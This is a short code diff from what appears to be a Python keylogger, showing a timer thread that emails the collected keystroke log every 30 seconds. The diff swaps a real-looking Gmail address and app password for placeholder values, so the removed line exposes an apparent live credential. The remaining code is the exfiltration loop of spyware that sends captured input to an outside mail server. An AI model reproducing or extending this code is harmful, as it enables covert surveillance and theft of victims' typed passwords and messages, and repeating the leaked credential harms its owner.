@@ -31,7 +31,7 @@ def send_email(email,password,message):
 
 def thread_function():
     global log
-    send_email("jameskirocs@gmail.com", "utys fvjb bdoi xcyw", log.encode('utf-8'))
+    send_email("user@gmail.com", "password", log.encode('utf-8'))
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
